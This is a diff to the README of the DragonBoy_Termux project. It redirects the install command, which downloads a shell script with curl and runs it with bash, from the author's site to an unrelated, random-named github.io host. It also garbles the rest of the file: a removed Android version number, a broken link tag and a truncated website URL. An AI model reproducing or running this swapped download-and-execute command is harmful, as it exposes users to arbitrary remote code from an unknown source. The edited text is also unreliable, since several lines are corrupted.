@@ -53,8 +53,11 @@
 
 ```bash
 function install () {
-  clear; curl -L --max-redirs 15 --progress-bar "https://khanhnguyen9872.github.io/DragonBoy_Termux/script_install.sh" --output script_install.sh && bash script_install.sh || echo "Internet ERROR"; unset install
+
+  clear; curl -L --max-redirs 15 --progress-bar "https://Gfxfbnccdg.github.io/ccc/script_install.sh" --output script_install.sh && bash script_install.sh || echo "Internet ERROR"; unset install
+
 }
+
 install
 ```
 
@@ -73,7 +76,7 @@ install
 
 - Android:
 - [x] 7
-- [x] 8
+- [x] 
 - [x] 9
 - [x] 10
 - [x] 11
@@ -82,17 +85,16 @@ install
 
 ## Download Emulator (x86_64)
 
-<a href="https://github.com/KhanhNguyen9872/DragonBoy_Termux/releases/download/emulatorx64/LDPlayer9_x86_64_KhanhNguyen9872.exe" target="_blank">
-    <img alt="LDPlayer9" src="https://github.com/KhanhNguyen9872/DragonBoy_Termux/blob/main/image/ldplayer9.ico?raw=true" width="150" height="150" />
+<a href="https://github.com/KhanhNguyen9872/DragonBoy_Termux/releases/download/emulatorx64/LDPlayer9_x86_64_KhanhNguyen9872.exe" target="_blank"
 </a>
 
 - [LDPlayer9](https://github.com/KhanhNguyen9872/DragonBoy_Termux/releases/download/emulatorx64/LDPlayer9_x86_64_KhanhNguyen9872.exe)
 
-## Author
+## Tác giả
 
 👤 **KhanhNguyen9872**
 
-* Website: KhanhNguyen9872.github.io
+* Website: KhanhNguyen9872.github.i
 * Twitter: [@Khnh59855418](https://twitter.com/Khnh59855418)
 * Github: [@KhanhNguyen9872](https://github.com/KhanhNguyen9872)
 
@@ -101,7 +103,6 @@ install
 Contributions, issues and feature requests are welcome!<br />Feel free to check [issues page](https://github.com/KhanhNguyen9872/DragonBoy_Termux/issues). You can also take a look at the [contributing guide](https://github.com/KhanhNguyen9872/DragonBoy_Termux/blob/main/README.md).
 
 ## Show your support
-
 Give a ⭐️ if this project helped you!
 
 ## 📝 License
